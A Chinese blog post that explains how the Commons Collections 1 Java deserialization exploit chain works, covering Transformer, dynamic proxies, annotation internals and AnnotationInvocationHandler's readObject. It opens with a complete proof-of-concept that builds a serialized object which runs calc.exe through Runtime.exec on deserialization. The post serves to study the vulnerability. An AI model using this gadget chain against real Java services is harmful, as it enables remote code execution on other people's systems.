---
layout: post
title: "Java反序列化漏洞研究前序: Transformer、动态代理与注解"
description: "Java反序列化漏洞前序"
category: 技术
tags: [漏洞, Java]
---
{% include JB/setup %}


今年给自己定了一个研究清楚Java反序列化漏洞的KPI，反序列化漏洞本身原理并不复杂，但是网上的资料都不甚满意，大部分都是只是知道怎么用别人的PoC，并没有对具体的原理做深入的分析和思考，特别是Commons Collections一系列的分析，非常不满意，比如反序列化为什么需要有自己的readObject、为什么AnnotationInvocationHandler的第一个参数为Override.class和Target.class都可以。最终我决定自己深入分析各个知识点。最主要是分析动态代理和注解，但是为了完整第一部分会分析Transformer。


<h3> PoC </h3>

首先，先放上最基本的Commons Collections的PoC，如下代码会直接弹出计算器。

        public static void main(String[] args) throws Exception {
            Transformer[] transformers = {
                    new ConstantTransformer(Runtime.class),
                    new InvokerTransformer("getMethod",new Class[]{String.class, Class[].class}, new Object[]{"getRuntime",null}),
                    new InvokerTransformer("invoke",new Class[]{Object.class, Object[].class}, new Class[]{Runtime.class, null}),
                    new InvokerTransformer("exec",new Class[]{String.class},new Object[]{"calc.exe"})
            };
            Transformer chain = new ChainedTransformer(transformers);
            Map innerMap = new HashMap();
            innerMap.put("value","test");
            Map outerMap = TransformedMap.decorate(innerMap, null, chain);

            Class cl = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
            Constructor ctor = cl.getDeclaredConstructor(Class.class, Map.class);

            ctor.setAccessible(true);

            Object instance = ctor.newInstance(Retention.class ,outerMap);


            //序列化
            FileOutputStream fos = new FileOutputStream("cc1");
            ObjectOutputStream oos = new ObjectOutputStream(fos);
            oos.writeObject(instance);
            oos.close();
            //反序列化
            FileInputStream fis = new FileInputStream("cc1");
            ObjectInputStream ois = new ObjectInputStream(fis);
            ois.readObject();
            ois.close();
        }

<h3> Transformer </h3>

Commons Collections里面提供了一个强大的接口叫做Transformer，顾名思义，这个接口用来实现一种转换，其中的InvokerTransformer特别重要，它会调用指定的函数进行转换，下面是使用该Transformer的一个例子。

        public class Main {

            public static void main(String[] args) {
                HashMap<String, String> a = new HashMap<>();

                Transformer keyTrans = new InvokerTransformer("concat", new Class[]{String.class}, new Object[]{"A"});
                Transformer valueTrans = new InvokerTransformer("toUpperCase", new Class[]{}, new Object[]{});

                Map b = TransformedMap.decorate(a, keyTrans, valueTrans);
                b.put("a", "aaa");
                b.put("b", "bbb");
                b.put("c", "ccc");

                Iterator it = b.entrySet().iterator();
                while(it.hasNext()) {
                    Map.Entry entry = (Map.Entry)it.next();
                    System.out.println("key="+entry.getKey()+",value="+entry.getValue());
                }
            }
        }

输出如下：

        key=cA,value=CCC
        key=bA,value=BBB
        key=aA,value=AAA

InvokerTransformer类的构造函数有三个参数，第一个是方法名，第二个是该方法的参数类型，第三个是传递给该方法的参数。TransformedMap.decorate的第一个参数是需要修饰的map，第二个是key所使用的Transformer，第三个是value所使用的Transformer。经过如此配置之后，当我们从被"decorate"之后的map(b)添加元素的时候，每一个添加的元素都会被经过“修饰”之后放到map(a)中去。

直接看TransformedMap的源码：

        public Object put(Object key, Object value) {
            key = this.transformKey(key);
            value = this.transformValue(value);
            return this.getMap().put(key, value);
        }
    
        protected Object transformKey(Object object) {
            return this.keyTransformer == null ? object : this.keyTransformer.transform(object);
        }

        protected Object transformValue(Object object) {
            return this.valueTransformer == null ? object : this.valueTransformer.transform(object);
        }

接着看看InvokerTransformer类的transform实现：

        public Object transform(Object input) {
            if (input == null) {
                return null;
            } else {
                try {
                    Class cls = input.getClass();
                    Method method = cls.getMethod(this.iMethodName, this.iParamTypes);
                    return method.invoke(input, this.iArgs);
                } catch (NoSuchMethodException var5) {
                    throw new FunctorException("InvokerTransformer: The method '" + this.iMethodName + "' on '" + input.getClass() + "' does not exist");
                } catch (IllegalAccessException var6) {
                    throw new FunctorException("InvokerTransformer: The method '" + this.iMethodName + "' on '" + input.getClass() + "' cannot be accessed");
                } catch (InvocationTargetException var7) {
                    throw new FunctorException("InvokerTransformer: The method '" + this.iMethodName + "' on '" + input.getClass() + "' threw an exception", var7);
                }
            }
        }

这段代码就是Commons Collections的核心的，本质上就是调用了参数input对应的类型的任意method方法，iMethodName、iParamTypes以及iArgs是InvokerTransformer在构造时候提供的参数。

回到PoC，其中我们使用了ChainedTransformer，代码如下：

            Transformer chain = new ChainedTransformer(transformers);
            Map innerMap = new HashMap();
            innerMap.put("value","test");
            Map outerMap = TransformedMap.decorate(innerMap, null, chain);

ChainedTransformer的transform实现如下：

        public Object transform(Object object) {
            for(int i = 0; i < this.iTransformers.length; ++i) {
                object = this.iTransformers[i].transform(object);
            }

            return object;
        }

其本质是将iTransformers（通过构造ChainedTransformer指定）逐个调用transform，前一个的返回结果作为后一个的参数。结合transformers的定义：

            Transformer[] transformers = {
                    new ConstantTransformer(Runtime.class),
                    new InvokerTransformer("getMethod",new Class[]{String.class, Class[].class}, new Object[]{"getRuntime",null}),
                    new InvokerTransformer("invoke",new Class[]{Object.class, Object[].class}, new Class[]{Runtime.class, null}),
                    new InvokerTransformer("exec",new Class[]{String.class},new Object[]{"calc.exe"})
            };

ConstantTransformer的transform仅为返回参数对应的Object，对于使用transformers来进行装饰的map，其transform的过程如下：

1. Runtime.class表示class Runtime，第一个链返回自身
2. Runtime.class本身是一个class Class的实例，并且Class是由getMethod方法的，所以在第一个InvokerTransformer会中在Runtime.class上调用getMethod参数设置为getRuntime，这样，获得了一个Method对象(getRuntime)
3. 在第二个InvokerTransformer会调用getRuntime这个Method的invoke方法，这样返回了一个Runtime对象
4. 在第三个InvokerTransformer会调用Runtime的exec函数，并且传递参数calc.exe，这样就达到了执行代码的目的。

这个过程本质上如图所示。

            Object obj0  = Runtime.class;
            Class cls1 = obj0.getClass();
            Method method1 = cls1.getMethod("getMethod", new Class[]{String.class, Class[].class});
            Object obj1 = method1.invoke(obj0, "getRuntime", new Class[0]);

            Class cls2 = obj1.getClass();
            Method method2 = cls2.getMethod("invoke", new Class[]{Object.class, Object[].class});
            Object obj2 = method2.invoke( obj1, null, new Object[0]);

            Class cls3 = obj2.getClass();
            Method method3 = cls3.getMethod("exec", new Class[]{String.class});
            Object obj3 = method3.invoke(obj2, "calc.exe");

下面是调试结果：

![](/assets/img/java1/1.png)




<h3> 动态代理 </h3>

动态代理的例子网上很多，随便找一个[例子](https://www.jianshu.com/p/9bcac608c714)来分析。

        interface HelloInterface {
            void sayHello();
        }

        class Hello implements HelloInterface{
            @Override
            public void sayHello() {
                System.out.println("Hello world!");
            }
        }

        class ProxyHandler implements InvocationHandler {
            private Object object;
            public ProxyHandler(Object object){
                this.object = object;
            }
            @Override
            public Object invoke(Object proxy, Method method, Object[] args) throws Throwable {
                System.out.println("Before invoke "  + method.getName());
                method.invoke(object, args);
                System.out.println("After invoke " + method.getName());
                return null;
            }
        }


        public class Main {

            public static void main(String[] args) throws Exception {
                System.getProperties().setProperty("sun.misc.ProxyGenerator.saveGeneratedFiles", "true");

                HelloInterface hello = new Hello();

                InvocationHandler handler = new ProxyHandler(hello);

                HelloInterface proxyHello = (HelloInterface) Proxy.newProxyInstance(hello.getClass().getClassLoader(), hello.getClass().getInterfaces(), handler);

                proxyHello.sayHello();

                System.out.println(proxyHello);

            }
        }

输出如下，可见通过proxyHello对象调用的函数都会经过我们的ProxyHandler代理。

        Before invoke sayHello
        Hello world!
        After invoke sayHello
        Before invoke toString
        After invoke toString
        null

通过调试可知，此时proxyHello本质上是一个实现了HelloInterface的$Proxy0类型对象，$Proxy0是内部生成的。

![](/assets/img/java1/2.png)

在目录下找到该文件查看内容如下，可见该自动生成的Proxy类实现了HelloInterface，其成员函数包含HelloInterface的接口sayHello以及所有Object接口的几个基本函数，其实现均为调用了super.h.invoke函数，这个函数就是代理handler(这里的ProxyHandler)需要实现的函数。

        public final class $Proxy0 extends Proxy implements HelloInterface {
            private static Method m3;
            private static Method m1;
            private static Method m0;
            private static Method m2;

            public $Proxy0(InvocationHandler var1) throws  {
                super(var1);
            }

            public final void sayHello() throws  {
                try {
                    super.h.invoke(this, m3, (Object[])null);
                } catch (RuntimeException | Error var2) {
                    throw var2;
                } catch (Throwable var3) {
                    throw new UndeclaredThrowableException(var3);
                }
            }

            public final boolean equals(Object var1) throws  {
                try {
                    return (Boolean)super.h.invoke(this, m1, new Object[]{var1});
                } catch (RuntimeException | Error var3) {
                    throw var3;
                } catch (Throwable var4) {
                    throw new UndeclaredThrowableException(var4);
                }
            }

            public final int hashCode() throws  {
                try {
                    return (Integer)super.h.invoke(this, m0, (Object[])null);
                } catch (RuntimeException | Error var2) {
                    throw var2;
                } catch (Throwable var3) {
                    throw new UndeclaredThrowableException(var3);
                }
            }

            public final String toString() throws  {
                try {
                    return (String)super.h.invoke(this, m2, (Object[])null);
                } catch (RuntimeException | Error var2) {
                    throw var2;
                } catch (Throwable var3) {
                    throw new UndeclaredThrowableException(var3);
                }
            }

            static {
                try {
                    m3 = Class.forName("test.com.company.HelloInterface").getMethod("sayHello");
                    m1 = Class.forName("java.lang.Object").getMethod("equals", Class.forName("java.lang.Object"));
                    m0 = Class.forName("java.lang.Object").getMethod("hashCode");
                    m2 = Class.forName("java.lang.Object").getMethod("toString");
                } catch (NoSuchMethodException var2) {
                    throw new NoSuchMethodError(var2.getMessage());
                } catch (ClassNotFoundException var3) {
                    throw new NoClassDefFoundError(var3.getMessage());
                }
            }
        }

回到例子中这一句：
        
        (HelloInterface) Proxy.newProxyInstance(hello.getClass().getClassLoader(), hello.getClass().getInterfaces(), handler);

可以看到newProxyInstance的参数，第一个是加载器，第二个是interfaces，第三个是处理handler，这里可以看到代理其实是绑定到interface的，跟具体实现Hello是没有关系的。所以我们的例子可以简化为如下：

        interface HelloInterface {
            void sayHello();
        }


        class ProxyHandler implements InvocationHandler {
            @Override
            public Object invoke(Object proxy, Method method, Object[] args) throws Throwable {
                System.out.println("Before invoke "  + method.getName());
                System.out.println(method.getName()+" is called");
                System.out.println("After invoke " + method.getName());
                return "test";
            }
        }

        public class Main {

            public static void main(String[] args) throws Exception {
                System.getProperties().setProperty("sun.misc.ProxyGenerator.saveGeneratedFiles", "true");

                InvocationHandler handler = new ProxyHandler();

                HelloInterface proxyHello = (HelloInterface) Proxy.newProxyInstance(HelloInterface.class.getClassLoader(), new Class[]{HelloInterface.class}, handler);

                proxyHello.sayHello();

                System.out.println(proxyHello);

            }
        }


输出如下：

        Before invoke sayHello
        sayHello is called
        After invoke sayHello
        Before invoke toString
        toString is called
        After invoke toString
        test

这个时候再去看生成的$Proxy0.class，内容其实是一样的。所以本质上，Proxy是为需要代理的接口生成了一个类，返回该的对象，用户可以通过该对象调用对应的接口，最终会调用到用户指定的handler中去。

<h3> Java注解实现 </h3>

本质上理解Java注解是为了理解Commons Collections中搞的AnnotationInvocationHandler的用法。
Java的注解是代码级别的注释，之所以说是注释是因为注解本身并不影响被注解代码的运行表现，之所以说是代码层面的，是因为注解也是会生成代码的，可以在运行时后获取注解，做一些判断、检查类的工作，比如Java编译时候使用。注解分为普通注解和元注解，普通注解比如@Override、@Deprecated用来作用在代码上，元注解比如@Retention、@Target等用来作用在程序员自定义的注解上。下面的代码，我们自己定义了两个注解，一个作用在类上，一个作用在方法上，并且自定义的Person类使用了这两个注解。

        @Retention(RetentionPolicy.RUNTIME)
        @Target(ElementType.TYPE)
        @interface AnnType {
            String msg() default "type";
        }

        @Retention(RetentionPolicy.RUNTIME)
        @Target(ElementType.METHOD)
        @interface AnnMethod {
            String msg() default "method";
        }


        @AnnType(msg="xaa")
        class Person {
            String name;
            int age;
            public Person() {
                name = "aa";
                age = 12;
            }
            public void print() {
                System.out.println(name);
            }

            @AnnMethod
            public String to_string() {
                return "Person{" +
                        "name='" + name + '\'' +
                        '}';
            }
        }

        public class Main {
            public static void main(String[] args) throws  Exception {
                System.setProperty("sun.misc.ProxyGenerator.saveGeneratedFiles", "true");
                System.out.println(new Person().to_string());
            }
        }

输出如下：

        Person{name='aa'}

可以看到注解并没有影响到代码功能。


<h4> 每一个注解实现为一个interface </h4>

下面的代码：

        Class<?> annTypecls = AnnType.class;
        Class<?>[] panntype = annTypecls.getInterfaces();

![](/assets/img/java1/3.png)


<h4> 注解的使用 </h4>


看看注解的使用：


        AnnType annType = Person.class.getAnnotation(AnnType.class);
        String annTypeValue = annType.msg();

        AnnMethod annMethod = Person.class.getMethod("to_string", new Class[0]).getAnnotation(AnnMethod.class);
        String annMethodValue = annMethod.msg();

        System.out.println("annTypevalue = " + annTypeValue+", annMethodValue = " + annMethodValue);


输出：

        annTypevalue = xaa, annMethodValue = method

对比例子代码，可以看到Class的注解为我们制定的值xaa，Method的注解为默认值method。我们已经知道注解是一个interface，那么Class/Method.getAnnotation返回必定是一个实现了这个interface的类。通过调试可以看到getAnnotation返回的是一个代理类型的对象。这就是我们在第二节中说的动态代理，并且其handler为AnnotationInvocationHandler。

![](/assets/img/java1/4.png)


<h4> Annotation实现 </h4>

这一节跟随

        Person.class.getAnnotation(AnnType.class);

研究Annotation的实现。


Class对象有一个annotations成员，保存了类型的注解信息，annotations是一个Map，key为注解Class，value为实现了Annotation的动态代理类。getAnnotation实现如下，initAnnotationsIfNecessary用来初始化annotations，仅会在第一次调用时执行实际工作。当annotations有值时，直接通过annotationClass查询Map返回即可。

        Map<Class<? extends Annotation>, Annotation> annotations;

        public <A extends Annotation> A getAnnotation(Class<A> annotationClass) {
            if (annotationClass == null)
                throw new NullPointerException();

            initAnnotationsIfNecessary();
            return (A) annotations.get(annotationClass);
        }

initAnnotationsIfNecessary的实现如下：

        private synchronized void initAnnotationsIfNecessary() {
            clearAnnotationCachesOnClassRedefinition();
            if (annotations != null)
                return;
            declaredAnnotations = AnnotationParser.parseAnnotations(
                getRawAnnotations(), getConstantPool(), this);
            Class<?> superClass = getSuperclass();
            if (superClass == null) {
                annotations = declaredAnnotations;
            } else {
                annotations = new HashMap<>();
                superClass.initAnnotationsIfNecessary();
                for (Map.Entry<Class<? extends Annotation>, Annotation> e : superClass.annotations.entrySet()) {
                    Class<? extends Annotation> annotationClass = e.getKey();
                    if (AnnotationType.getInstance(annotationClass).isInherited())
                        annotations.put(annotationClass, e.getValue());
                }
                annotations.putAll(declaredAnnotations);
            }
        }

从上述代码可知，Class类其实还有一个成员declaredAnnotations，这个成员保存的是Class自身的注解声明，如果没有父类，那么annotations和declaredAnnotations保存的是一样的数据，如果有父类，initAnnotationsIfNecessary还会将父类的注解放到annotations中。重点来到了如下调用：

        declaredAnnotations = AnnotationParser.parseAnnotations(
            getRawAnnotations(), getConstantPool(), this);

一路跟进，经过parseAnnotations->parseAnnotations2->parseAnnotation2，最后一个函数完成实际的注解解析工作。

        private static Annotation parseAnnotation2(ByteBuffer var0, ConstantPool var1, Class<?> var2, boolean var3, Class<? extends Annotation>[] var4) {
                int var5 = var0.getShort() & '\uffff';
                Class var6 = null;
                String var7 = "[unknown]";

                try {
                    try {
                        var7 = var1.getUTF8At(var5);//var7为类名 Ltest/com/company/AnnType;
                        var6 = parseSig(var7, var2);//var6为 interface test.com.company.AnnType
                    } catch (IllegalArgumentException var18) {
                        var6 = var1.getClassAt(var5);
                    }
                }...
                if (var4 != null && !contains(var4, var6)) {
                    skipAnnotation(var0, false);
                    return null;
                } else {
                    AnnotationType var8 = null;

                    try {
                        var8 = AnnotationType.getInstance(var6);//var8为AnnotationType
                    } catch (IllegalArgumentException var17) {
                        skipAnnotation(var0, false);
                        return null;
                    }

                    Map var9 = var8.memberTypes();
                    LinkedHashMap var10 = new LinkedHashMap(var8.memberDefaults());
                    int var11 = var0.getShort() & '\uffff';

                    for(int var12 = 0; var12 < var11; ++var12) {
                        int var13 = var0.getShort() & '\uffff';
                        String var14 = var1.getUTF8At(var13);
                        Class var15 = (Class)var9.get(var14);
                        if (var15 == null) {
                            skipMemberValue(var0);
                        } else {
                            Object var16 = parseMemberValue(var15, var0, var1, var2);
                            if (var16 instanceof AnnotationTypeMismatchExceptionProxy) {
                                ((AnnotationTypeMismatchExceptionProxy)var16).setMember((Method)var8.members().get(var14));
                            }

                            var10.put(var14, var16);
                        }
                    }

                    return annotationForMap(var6, var10);
                }
            }

前面提到注解是一个继承自Annotation的interface，这里新出现了AnnotationType，这个是类中存放的是注解的信息。这里简单介绍一下该结构体，其中三个最主要的成为如下三个Map。

        private final Map<String, Class<?>> memberTypes;
        private final Map<String, Object> memberDefaults;
        private final Map<String, Method> members;

第一个memberTypes存放的是名字到Class的对应关系，第二个memberDefaults存放的是名字到默认值的对应关系，第三个members存放的是名字到方法的对应关系。以我们例子的AnnType注解为例，成员如下：

![](/assets/img/java1/5.png)


AnnotationType是通过AnnotationType.getInstance创建的，parseAnnotation2调用了该函数。parseAnnotation2最后的for循环是将注解的默认值替换为实际值。比如AnnType的默认值是type，但是在Person中被设置为了xaa。


parseAnnotation2的最后来到了annotationForMap。

        public static Annotation annotationForMap(Class<? extends Annotation> var0, Map<String, Object> var1) {
            return (Annotation)Proxy.newProxyInstance(var0.getClassLoader(), new Class[]{var0}, new AnnotationInvocationHandler(var0, var1));
        }

annotationForMap创建了动态代理，这里的var0参数是AnnType的Class对象，var1是一个LinkedHashMap，里面保存了各个注解名称与值。比如Person类的注解内容"msg"->"xaa"。handler为AnnotationInvocationHandler。

        AnnotationInvocationHandler(Class<? extends Annotation> var1, Map<String, Object> var2) {
            Class[] var3 = var1.getInterfaces();
            if (var1.isAnnotation() && var3.length == 1 && var3[0] == Annotation.class) {
                this.type = var1;
                this.memberValues = var2;
            } else {
                throw new AnnotationFormatError("Attempt to create proxy for a non-annotation type.");
            }
        }

构造函数将Annotation的type信息和各个注解key-value保存到了memberValues中。

当测试例子中调用annMethod.msg()时，会调用到代理类中的invoke，代理类会调用handler的invoke，AnnotationInvocationHandler的invoke如下。

            public Object invoke(Object var1, Method var2, Object[] var3) {
                String var4 = var2.getName();
                Class[] var5 = var2.getParameterTypes();
                if (var4.equals("equals") && var5.length == 1 && var5[0] == Object.class) {
                    return this.equalsImpl(var3[0]);
                } else if (var5.length != 0) {
                    throw new AssertionError("Too many parameters for an annotation method");
                } else {
                    byte var7 = -1;
                    switch(var4.hashCode()) {
                    case -1776922004:
                        if (var4.equals("toString")) {
                            var7 = 0;
                        }
                        break;
                    case 147696667:
                        if (var4.equals("hashCode")) {
                            var7 = 1;
                        }
                        break;
                    case 1444986633:
                        if (var4.equals("annotationType")) {
                            var7 = 2;
                        }
                    }

                    switch(var7) {
                    case 0:
                        return this.toStringImpl();
                    case 1:
                        return this.hashCodeImpl();
                    case 2:
                        return this.type;
                    default:
                        Object var6 = this.memberValues.get(var4);
                        if (var6 == null) {
                            throw new IncompleteAnnotationException(this.type, var4);
                        } else if (var6 instanceof ExceptionProxy) {
                            throw ((ExceptionProxy)var6).generateException();
                        } else {
                            if (var6.getClass().isArray() && Array.getLength(var6) != 0) {
                                var6 = this.cloneArray(var6);
                            }

                            return var6;
                        }
                    }
                }
            }

可以看到对于非内置的函数调用，通过var4得到方法名，接着在this.memberValues这个Map中查找，进而得到value返回。

<h3> PoC分析 </h3>

在PoC中，本质上写入文件的是AnnotationInvocationHandler的一个实例，其中参数是Retention.class和一个TransformedMap。正向思考，这里意思是构建一个处理Retention注解的AnnotationInvocationHandler，并且其对应的Map为TransformedMap。当然这里的TransformedMap的状态，比如transformers也会被写入到文件中。

当进行反序列化时，AnnotationInvocationHandler有自己的readObject，该函数会被调用。

            private void readObject(ObjectInputStream var1) throws IOException, ClassNotFoundException {
                var1.defaultReadObject();
                AnnotationType var2 = null;

                try {
                    var2 = AnnotationType.getInstance(this.type);
                } catch (IllegalArgumentException var9) {
                    throw new InvalidObjectException("Non-annotation type in annotation serial stream");
                }

                Map var3 = var2.memberTypes();
                Iterator var4 = this.memberValues.entrySet().iterator();

                while(var4.hasNext()) {
                    Entry var5 = (Entry)var4.next();
                    String var6 = (String)var5.getKey();
                    Class var7 = (Class)var3.get(var6);
                    if (var7 != null) {
                        Object var8 = var5.getValue();
                        if (!var7.isInstance(var8) && !(var8 instanceof ExceptionProxy)) {
                            var5.setValue((new AnnotationTypeMismatchExceptionProxy(var8.getClass() + "[" + var8 + "]")).setMember((Method)var2.members().get(var6)));
                        }
                    }
                }

            }
    
var1.defaultReadObject首先调用默认的反序列化函数，这样就将AnnotationInvocationHandler准备好了。

![](/assets/img/java1/6.png)

接下来得到Retention注解的AnnotationType结构体。

![](/assets/img/java1/7.png)

Retention是一个元注解，所以这里的AnnotationType是根据如下定义得到的。

        @Documented
        @Retention(RetentionPolicy.RUNTIME)
        @Target(ElementType.ANNOTATION_TYPE)
        public @interface Retention {
            RetentionPolicy value();
        }

现在，var3这个Map保存的是正儿八经的Retention注解的成员类型信息，其中key为"value", value为"RetentionPolicy"这是一个自定义的类。
接下来对我们反序列化出来的this.memberValues的Map进行循环。本质上判断反序列化出来的value的类型是不是跟生成的AnnotationType的memberTypes能对得上。
由于我们在序列化构建AnnotationInvocationHandler指定的Map里面放了"value"="test", value的类型是String，而实际上根据AnnotationType的指示，这里需要的是一个RetentionPolicy，所以最终会调用var5.setValue，最终会调用到TransformedMap的checkSetValue函数。从而调用到了transform函数。

        protected Object checkSetValue(Object value) {
            return this.valueTransformer.transform(value);
        }


综上，AnnotationInvocationHandler的readObject其实本质上是在做一个校验，如果过不了这个判断，那么会调用Map的设置函数，从而触发了Transformer的transform的函数，进而执行了任意代码。

<h3> 总结 </h3>

本文通过一个Commons Collections的PoC详细讲解了涉及到的对于初学者比较难理解的概念，主要包括动态代理和注解实现。通过本文的分析，应该能够理解AnnotationInvocationHandler相关的Commons Collections的利用链。从本文的分析也可以看出，Commons Collections的利用还是比较复杂的，并不太适合初学者，其实Fastjson反序列化倒是没有这么复杂。